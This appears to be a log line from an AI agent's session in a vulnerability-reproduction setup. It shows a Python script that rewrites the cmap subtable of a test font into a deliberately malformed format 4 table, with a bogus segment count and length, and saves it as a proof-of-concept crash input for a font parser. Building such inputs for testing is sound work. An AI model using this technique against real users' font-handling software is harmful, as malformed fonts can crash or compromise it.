Running command: cd /workspace/repo-vul/src-vul && python3 - <<'PY'
from pathlib import Path
import struct
p=Path('font-corpus/TestCMAP13.ttf')
data=bytearray(p.read_bytes())
# cmap table at 408, subtable at 420
sub=420
fmt, length, lang = struct.unpack('>HHH', data[sub:sub+6])
print('before', fmt, length, lang)
# make format 4 with tiny length and bogus segCountX2 to stress parser
# format 4 header: format,length,language,segCountX2,searchRange,entrySelector,rangeShift
# set segCountX2=4 => 2 segments, length=32
struct.pack_into('>HHH', data, sub, 4, 32, 0)
struct.pack_into('>HHHHHH', data, sub+6, 4, 4, 1, 0, 0, 0)
# endCodes[2], reservedPad, startCodes[2], idDelta[2], idRangeOffset[2]
struct.pack_into('>HHHHHHHH', data, sub+18, 0x0041, 0xFFFF, 0, 0x0041, 1, 1, 0, 0)
# write back
Path('/workspace/poc_badcmap.ttf').write_bytes(data)
print('wrote', len(data))
PY
